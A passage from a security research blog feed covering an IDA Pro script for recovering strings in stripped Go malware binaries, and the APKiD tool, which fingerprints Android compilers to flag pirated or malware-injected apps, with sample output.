class="number">1</span>:GetOpnd(addr_2, <span class="number">0</span>).index(<span class="string">'['</span>) + <span class="number">4</span>]</div><div class="line">            <span class="keyword">except</span> ValueError:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> GetMnem(addr_2) == <span class="string">'mov'</span> <span class="keyword">and</span> dest_reg <span class="keyword">in</span> VALID_DEST <span class="keyword">and</span> (<span class="string">'[%s'</span> % dest_reg) <span class="keyword">in</span> GetOpnd(addr_2, <span class="number">0</span>) <span class="keyword">and</span> GetOpnd(addr_2, <span class="number">1</span>) == from_reg:</div><div class="line">                <span class="comment"># Check for last part, could be improved</span></div><div class="line">                addr_3 = FindCode(addr_2, SEARCH_DOWN)</div><div class="line">                <span class="keyword">if</span> GetMnem(addr_3) == <span class="string">'mov'</span> <span class="keyword">and</span> ((<span class="string">'[%s+'</span> % dest_reg) <span class="keyword">in</span> GetOpnd(addr_3, <span class="number">0</span>) <span class="keyword">or</span> GetOpnd(addr_3, <span class="number">0</span>) <span class="keyword">in</span> VALID_DEST) <span class="keyword">and</span> <span class="string">'offset '</span> <span class="keyword">not</span> <span class="keyword">in</span> GetOpnd(addr_3, <span class="number">1</span>) <span class="keyword">and</span> <span class="string">'dword ptr ds'</span> <span class="keyword">not</span> <span class="keyword">in</span> GetOpnd(addr_3, <span class="number">1</span>):</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        dumb_int_test = GetOperandValue(addr_3, <span class="number">1</span>)</div><div class="line">                        <span class="keyword">if</span> dumb_int_test &gt; <span class="number">0</span> <span class="keyword">and</span> dumb_int_test &lt; sys.maxsize:</div><div class="line">                            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">                    <span class="keyword">except</span> ValueError:</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_string</span><span class="params">(addr, string_len)</span>:</span></div><div class="line">    debug(<span class="string">'Found string load @ 0x%x with length of %d'</span> % (addr, string_len))</div><div class="line">    <span class="comment"># This may be overly aggressive if we found the wrong area...</span></div><div class="line">    <span class="keyword">if</span> GetStringType(addr) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> GetString(addr) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> len(GetString(addr)) != string_len:</div><div class="line">        debug(<span class="string">'It appears that there is already a string present @ 0x%x'</span> % addr)</div><div class="line">        MakeUnknown(addr, string_len, DOUNK_SIMPLE)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> GetString(addr) <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">and</span> MakeStr(addr, addr + string_len):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment"># If something is already partially analyzed (incorrectly) we need to MakeUnknown it</span></div><div class="line">        MakeUnknown(addr, string_len, DOUNK_SIMPLE)</div><div class="line">        <span class="keyword">if</span> MakeStr(addr, addr + string_len):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        debug(<span class="string">'Unable to make a string @ 0x%x with length of %d'</span> % (addr, string_len))</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<p>The above code could likely be optimized, however it was working for me on the samples I needed. All that would be left is to create another function which hunts through all the defined code segments to look for string loads. Then we can use the pointer to the string and the string length to define a new string using the <code>MakeStr</code>. In the code I ended up using, you need to ensure that IDA Pro hasn’t mistakenly already create the string, as it sometimes tries to, incorrectly. This seems to happen sometimes when a string in the table contains a null character. However, after using code above, this is what we are left with;</p>
<p><img src="/images/reversing_go_binaries_like_a_pro/stripped_rex_strings.png" alt=""></p>
<p>This is a much better piece of code to work with. After we throw together all these functions, we now have the <a href="https://github.com/strazzere/golang_loader_assist/blob/master/golang_loader_assist.py" target="_blank" rel="external">golang_loader_assist.py</a> module for IDA Pro. A word of warning though, I have only had time to test this on a few versions of IDA Pro for OSX, the majority of testing on 6.95. There is also very likely optimizations which should be made or at a bare minimum some reworking of the code. With all that said, I wanted to open source this so others could use this and hopefully contribute back. Also be aware that this script can be painfully slow depending on how large the <code>idb</code> file is, working on a OSX El Capitan (10.11.6) using a 2.2 GHz Intel Core i7 on IDA Pro 6.95 - the string discovery aspect itself can take a while. I’ve often found that running the different methods seperately can prevent IDA from locking up. Hopefully this blog and the code proves useful to someone though, enjoy!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GO binaries are weird, or at least, that is where this all started out. While delving into some &lt;a href=&quot;http://securityaffairs.co/wordpress/50556/malware/linux-rex-1-botnet.html&quot;&gt;Linux malware named Rex&lt;/a&gt;, I came to the realization that I might need to understand more than I wanted to. Just the prior week I had been reversing &lt;a href=&quot;https://news.drweb.com/news/?i=10140&amp;amp;lng=en&quot;&gt;Linux Lady&lt;/a&gt; which was also written in GO, however it was not a stripped binary so it was pretty easy. Clearly the binary was rather large, many extra methods I didn’t care about - though I really just didn’t understand why. To be honest - I still haven’t fully dug into the Golang code and have yet to really write much code in Go, so take this information at face value as some of it might be incorrect; this is just my experience while reversing some ELF Go binaries! If you don’t want to read the whole page, or scroll to the bottom to get a link to the full repo, just go &lt;a href=&quot;https://github.com/strazzere/golang_loader_assist&quot;&gt;here&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
    
      <category term="research" scheme="https://rednaga.io/tags/research/"/>
    
      <category term="golang" scheme="https://rednaga.io/tags/golang/"/>
    
      <category term="ida pro" scheme="https://rednaga.io/tags/ida-pro/"/>
    
  </entry>
  
  <entry>
    <title>Detecting Pirated and Malicious Android Apps with APKiD</title>
    <link href="https://rednaga.io/2016/07/31/detecting_pirated_and_malicious_android_apps_with_apkid/"/>
    <id>https://rednaga.io/2016/07/31/detecting_pirated_and_malicious_android_apps_with_apkid/</id>
    <published>2016-07-31T07:00:00.000Z</published>
    <updated>2017-10-29T00:28:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>Android apps are much easier to modify than those of traditional desktop operating systems like Windows or Linux, and there’s primarily only <em>one</em> way to modify Android apps after they have been compiled from source: <a href="https://mvnrepository.com/artifact/org.smali/dexlib2" target="_blank" rel="external">dexlib</a>. Even if you’re actually using <a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">Apktool</a> or <a href="https://github.com/JesusFreke/smali" target="_blank" rel="external">Smali</a>, they are both using dexlib under the hood. Actually, Apktool uses Smali, and Smali and dexlib are part of the same project.</p>
<p>Why is this important? Any app which has had malware injected into it or has been cracked or pirated will have <em>probably</em> been disassembled and recompiled by dexlib. Also, there are very few reasons why a developer with access to the source code would use dexlib. Therefore, you know an app has been modified by dexlib, it’s probably interesting to you if you’re worried about malware or app piracy. This is where <a href="https://github.com/rednaga/APKiD" target="_blank" rel="external">APKiD</a> comes in. In addition to detecting packers, obfuscators, and other weird stuff, it can also identify if an app was compiled by the standard Android compilers or dexlib.<br><a id="more"></a></p>
<h1 id="APKiD"><a href="#APKiD" class="headerlink" title="APKiD"></a>APKiD</h1><p>APKiD can look at an Android APK or DEX file and detect the fingerprints of several different compilers:</p>
<ul>
<li>dx - standard Android SDK compiler</li>
<li>dexmerge - used for incremental builds by some IDEs (after using dx)</li>
<li>dexlib 1.x</li>
<li>dexlib 2.x beta</li>
<li>dexlib 2.x</li>
</ul>
<p>If any of the dexlib families have been used to create a DEX file, you can be fairly suspicious it has been cracked and it may have been injected with malware. For more info on how we used compiler fingerprinting to detect malware and cracks, check out our talk <a href="/2016/07/30/apkid_and_android_compiler_fingerprinting/">Android Compiler Fingerprinting</a>.</p>
<h2 id="Detecting-dx-and-dexmerge"><a href="#Detecting-dx-and-dexmerge" class="headerlink" title="Detecting dx and dexmerge"></a>Detecting dx and dexmerge</h2><p>The main way dx and dexmerge are identified are by looking at the ordering of the map types in the DEX file.</p>
<p><img src="/images/detecting_pirated_and_malicious_android_apps_with_apkid/abnormal_type_order.png" alt=""></p>
<p>This is a good place to identify different compilers because the order is not defined in the spec so it’s up to the compiler how it wants to order these things.</p>
<p>In order to have something that’s copy / paste-able, here’s some Java code for the normal type order:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> TypeCode[] NORMAL_TYPE_ORDER = <span class="keyword">new</span> TypeCode[] &#123;</div><div class="line">  TypeCode.HEADER_ITEM,</div><div class="line">  TypeCode.STRING_ID_ITEM,</div><div class="line">  TypeCode.TYPE_ID_ITEM,</div><div class="line">  TypeCode.PROTO_ID_ITEM,</div><div class="line">  TypeCode.FIELD_ID_ITEM,</div><div class="line">  TypeCode.METHOD_ID_ITEM,</div><div class="line">  TypeCode.CLASS_DEF_ITEM,</div><div class="line">  TypeCode.ANNOTATION_SET_REF_LIST,</div><div class="line">  TypeCode.ANNOTATION_SET_ITEM,</div><div class="line">  TypeCode.CODE_ITEM,</div><div class="line">  TypeCode.ANNOTATIONS_DIRECTORY_ITEM,</div><div class="line">  TypeCode.TYPE_LIST,</div><div class="line">  TypeCode.STRING_DATA_ITEM,</div><div class="line">  TypeCode.DEBUG_INFO_ITEM,</div><div class="line">  TypeCode.ANNOTATION_ITEM,</div><div class="line">  TypeCode.ENCODED_ARRAY_ITEM,</div><div class="line">  TypeCode.CLASS_DATA_ITEM,</div><div class="line">  TypeCode.MAP_LIST</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>The dexmerge type order was derived by looking at <a href="http://osxr.org/android/source/dalvik/dx/src/com/android/dx/merge/DexMerger.java#0111" target="_blank" rel="external">DexMerger.java</a>. I got the typeIds order by looking <a href="http://osxr.org/android/source/dalvik/dx/src/com/android/dx/merge/DexMerger.java#0904" target="_blank" rel="external">here</a>.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> TypeCode[] DEXMERGE_TYPE_ORDER = <span class="keyword">new</span> TypeCode[] &#123;</div><div class="line">  TypeCode.HEADER_ITEM,</div><div class="line">  TypeCode.STRING_ID_ITEM,</div><div class="line">  TypeCode.TYPE_ID_ITEM,</div><div class="line">  TypeCode.PROTO_ID_ITEM,</div><div class="line">  TypeCode.FIELD_ID_ITEM,</div><div class="line">  TypeCode.METHOD_ID_ITEM,</div><div class="line">  TypeCode.CLASS_DEF_ITEM,</div><div class="line">  TypeCode.MAP_LIST,</div><div class="line">  TypeCode.TYPE_LIST,</div><div class="line">  TypeCode.ANNOTATION_SET_REF_LIST,</div><div class="line">  TypeCode.ANNOTATION_SET_ITEM,</div><div class="line">  TypeCode.CLASS_DATA_ITEM,</div><div class="line">  TypeCode.CODE_ITEM,</div><div class="line">  TypeCode.STRING_DATA_ITEM,</div><div class="line">  TypeCode.DEBUG_INFO_ITEM,</div><div class="line">  TypeCode.ANNOTATION_ITEM,</div><div class="line">  TypeCode.ENCODED_ARRAY_ITEM,</div><div class="line">  TypeCode.ANNOTATIONS_DIRECTORY_ITEM</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>In general, the format of a DEX file and the items inside are like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">header</div><div class="line">  HEADER_ITEM</div><div class="line">stringIds</div><div class="line">  STRING_ID_ITEM</div><div class="line">typeIds</div><div class="line">  TYPE_ID_ITEM</div><div class="line">protoIds</div><div class="line">  PROTO_ID_ITEM</div><div class="line">fieldIds</div><div class="line">  FIELD_ID_ITEM</div><div class="line">methodIds</div><div class="line">  METHOD_ID_ITEM</div><div class="line">classDefs</div><div class="line">  CLASS_DEF_ITEM</div><div class="line">wordData (sort by TYPE)</div><div class="line">  ANNOTATION_SET_REF_LIST</div><div class="line">  ANNOTATION_SET_ITEM</div><div class="line">  CODE_ITEM</div><div class="line">  ANNOTATIONS_DIRECTORY_ITEM</div><div class="line">typeLists (no sort)</div><div class="line">  TYPE_LIST</div><div class="line">stringData (sort by INSTANCE)</div><div class="line">  STRING_DATA_ITEM</div><div class="line">byteData (sort by TYPE)</div><div class="line">  DEBUG_INFO_ITEM</div><div class="line">  ANNOTATION_ITEM</div><div class="line">  ENCODED_ARRAY_ITEM</div><div class="line">classData (no sort)</div><div class="line">  CLASS_DATA_ITEM</div><div class="line">map (no sort)</div><div class="line">  MAP_LIST</div></pre></td></tr></table></figure>
<p>This list may be handy for ongoing research into fingerprinting different compilers.</p>
<h2 id="Detecting-dexlib-1-x"><a href="#Detecting-dexlib-1-x" class="headerlink" title="Detecting dexlib 1.x"></a>Detecting dexlib 1.x</h2><p>This is the first library that allowed disassembling and compiling of DEX files without the source code. It was created by Ben “Jesus Freke” Gruver. It’s detected primarily by looking at the physical sorting of the strings.</p>
<p><img src="/images/detecting_pirated_and_malicious_android_apps_with_apkid/abnormal_string_sort.png" alt=""></p>
<p>The DEX format requires that the string table, which list all the strings and their offset into the file, must be sorted alphabetically, but the actual physical ordering of the strings in the file are not necessarily sorted. So while dx sorts strings alphabetically, even though it doesn’t have to, dexlib seems to sort them physically based on when they’re encountered during compilation.</p>
<p>A lot of commercial packers and obfuscators and certain malware families still use dexlib 1.x under the hood because it’s pretty solid and they’re too lazy to update.</p>
<h2 id="Detecting-dexlib-2-x-beta"><a href="#Detecting-dexlib-2-x-beta" class="headerlink" title="Detecting dexlib 2.x beta"></a>Detecting dexlib 2.x beta</h2><p>Dexlib 1.x was rewritten into dexlib 2, and while it was in a beta release, we noticed that it did something weird with how it marked class interfaces.</p>
<p><img src="/images/detecting_pirated_and_malicious_android_apps_with_apkid/abnormal_class_interfaces.png" alt=""></p>
<p>You can see <code>AC 27 00 00</code> all over the file. That’s the offset to the “null” interface for classes which don’t implement any interface. It’s a good example of how flexible the DEX format is, because I would figure this wouldn’t run at all, but it does. The dx compiler just uses <code>00</code>s to indicate that there’s no interface.</p>
<p>This was removed before dexlib 2.x was moved out of beta.</p>
<h2 id="Detecting-dexlib-2-x"><a href="#Detecting-dexlib-2-x" class="headerlink" title="Detecting dexlib 2.x"></a>Detecting dexlib 2.x</h2><p>This compiler is also detected by also looking at the map type order. Assembling a DEX file is complex and there are a lot of tiny little details you need to mimic to create an absolutely perfect facsimile. That’s a lot of extra work most developers don’t want to do.</p>
<p>As an aside, I spend a lot of time using this library and looking at it’s code while working on a generic Android deobfuscator called <a href="https://travis-ci.org/CalebFenton/simplify" target="_blank" rel="external">Simplify</a>. And I’ve got to say, it’s some really impressive and <em>clean</em> code that I’ve learned a lot from. Kudos to <a href="https://github.com/JesusFreke" target="_blank" rel="external">Ben</a>.</p>
<h1 id="Using-APKiD"><a href="#Using-APKiD" class="headerlink" title="Using APKiD"></a>Using APKiD</h1><p>The usage of APKiD is quite simple. You just point it at folders, files, whatever, and it’ll try and find APKs and DEX files. It’ll also decompose APKs and try and find compressed APKs, DEX, and ELF files. Here’s output of an example run:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">$ apkid test-data/apk test-data/dex</div><div class="line">[!] APKiD 0.9.3 :: from RedNaga :: rednaga.io</div><div class="line">[*] test-data/dex/dexguard1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexguard2.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexguard3.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexlib1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/dex/dexlib2.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/dex/dexmerge.dex</div><div class="line"> |-&gt; compiler : Android SDK (dexmerge)</div><div class="line">[*] test-data/dex/dexprotector1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dexprotector2.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dexprotector3.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dx.dex</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div></pre></td></tr></table></figure>
<p>You can see that the test samples of DexGuard and DexProtector both use dexlib 1.x. APKiD also supports JSON output so it’s easier to integrate into other toolchains:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"test-data/dex/dexprotector1.dex"</span>: &#123;</div><div class="line">    <span class="attr">"obfuscator"</span>: [</div><div class="line">      <span class="string">"DexProtect"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexlib1.dex"</span>: &#123;</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexguard3.dex"</span>: &#123;</div><div class="line">    <span class="attr">"obfuscator"</span>: [</div><div class="line">      <span class="string">"DexGuard"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"anti_disassembly"</span>: [</div><div class="line">      <span class="string">"illegal class name"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexlib2.dex"</span>: &#123;</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 2.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexguard1.dex"</span>: &#123;</div><div class="line">    <span class="attr">"obfuscator"</span>: [</div><div class="line">      <span class="string">"DexGuard"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexmerge.dex"</span>: &#123;</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"Android SDK (dexmerge)"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dx.dex"</span>: &#123;</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"Android SDK (dx)"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexguard2.dex"</span>: &#123;</div><div class="line">    <span class="attr">"obfuscator"</span>: [</div><div class="line">      <span class="string">"DexGuard"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"anti_disassembly"</span>: [</div><div class="line">      <span class="string">"illegal class name"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"test-data/dex/dexprotector2.dex"</span>: &#123;</div><div class="line">    <span class="attr">"obfuscator"</span>: [</div><div class="line">      <span class="string">"DexProtect"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"compiler"</span>: [</div><div class="line">      <span class="string">"dexlib 1.x"</span></div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Ideas-for-the-Future"><a href="#Ideas-for-the-Future" class="headerlink" title="Ideas for the Future"></a>Ideas for the Future</h2><p>This post leaves out all of the Android XML fingerprinting details <a href="https://github.com/strazzere" target="_blank" rel="external">Tim</a> researched that can identify tools like Apktool. We still need to add these fingerprints into APKiD.</p>
<p>There is also a library called ASMDEX which looks capable of creating DEX files. At the time of this original research a few years ago, I didn’t have time to look into it, and no one was talking about how to use it. A lot of the stuff was over my head, but I’ve since had a lot of practice using ASM to create Java class files, so I think I can manage now. It would be nice to add fingerprints for ASMDEX. Anything created by that would probably be pretty weird.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android apps are much easier to modify than those of traditional desktop operating systems like Windows or Linux, and there’s primarily only &lt;em&gt;one&lt;/em&gt; way to modify Android apps after they have been compiled from source: &lt;a href=&quot;https://mvnrepository.com/artifact/org.smali/dexlib2&quot;&gt;dexlib&lt;/a&gt;. Even if you’re actually using &lt;a href=&quot;https://ibotpeaches.github.io/Apktool/&quot;&gt;Apktool&lt;/a&gt; or &lt;a href=&quot;https://github.com/JesusFreke/smali&quot;&gt;Smali&lt;/a&gt;, they are both using dexlib under the hood. Actually, Apktool uses Smali, and Smali and dexlib are part of the same project.&lt;/p&gt;
&lt;p&gt;Why is this important? Any app which has had malware injected into it or has been cracked or pirated will have &lt;em&gt;probably&lt;/em&gt; been disassembled and recompiled by dexlib. Also, there are very few reasons why a developer with access to the source code would use dexlib. Therefore, you know an app has been modified by dexlib, it’s probably interesting to you if you’re worried about malware or app piracy. This is where &lt;a href=&quot;https://github.com/rednaga/APKiD&quot;&gt;APKiD&lt;/a&gt; comes in. In addition to detecting packers, obfuscators, and other weird stuff, it can also identify if an app was compiled by the standard Android compilers or dexlib.&lt;br&gt;
    
    </summary>
    
    
      <category term="apkid" scheme="https://rednaga.io/tags/apkid/"/>
    
      <category term="research" scheme="https://rednaga.io/tags/research/"/>
    
  </entry>
  
  <entry>
    <title>APKiD and Android Compiler Fingerprinting</title>
    <link href="https://rednaga.io/2016/07/30/apkid_and_android_compiler_fingerprinting/"/>
    <id>https://rednaga.io/2016/07/30/apkid_and_android_compiler_fingerprinting/</id>
    <published>2016-07-30T07:00:00.000Z</published>
    <updated>2017-10-29T00:34:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>We recently gave a presentation at <a href="http://hitcon.org/2016/CMT/" target="_blank" rel="external">HITCON 2016</a> called <a href="http://hitcon.org/2016/CMT/slide/day1-r0-e-1.pdf" target="_blank" rel="external">Android Compiler Fingerprinting</a><br> where in we released a tool called: <a href="https://github.com/rednaga/APKiD" target="_blank" rel="external">APKiD</a>. It’s basically PEiD for Android – it detects several compilers, obfuscators, and packers and we’re adding to it whenever we find new stuff. You’re welcome to submit your rules also.<br><a id="more"></a></p>
<p>Here’s the full abstract:</p>
<blockquote>
<p>Compiler fingerprinting is a technique for identifying the compiler used to create a binary. This is because there is some flexibility in file formats, and different compilers usually produce binaries with identical behaviors but with subtle differences in structure and organization. We developed a tool which can determine the compiler used to create Dalvik executables and Android binary XML files. This allowed us to distinguish between apps compiled from original source code and apps which had been modified using non-standard compilers such as dexlib. Our hypothesis was that the two primary reasons reasons for modifying an Android app were for 1.) cracking and piracy and 2.) injecting malicious code. We tested this assumption by comparing the compiler profiles of various app markets with varying tolerances for cracked and malicious apps to see if the percentage of modified apps was inversely proportional to how strict the store was about policing submissions. We found that strict markets such as Google Play and Amazon had significantly lower rates of modified apps compared to less strict markets such as Aptoide and BlapkMarket. Additionally, we analyzed ~138,000 benign apps and known malware samples to compare the rates of modification between both groups. We found much higher rates of modification within the malware sample set with many malware families consisting entirely of modified apps.</p>
<p>This talk presents the history and evolution of various Android tools, introduces tools for fingerprinting compilers, summarizes the technical details for how the tools work, and reviews applications for using compiler fingerprinting to improve detection and classification of malware and pirated apps.</p>
</blockquote>
<p>We’ll post the video of our talk as soon as it’s available!</p>
<!-- more -->
<p>This is the output when it’s run against our test files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">$ apkid test-data</div><div class="line">[!] APKiD 0.9.3 :: from RedNaga :: rednaga.io</div><div class="line">[*] test-data/apk/dexguard1.apk!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/apk/dexguard2.apk!classes.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div 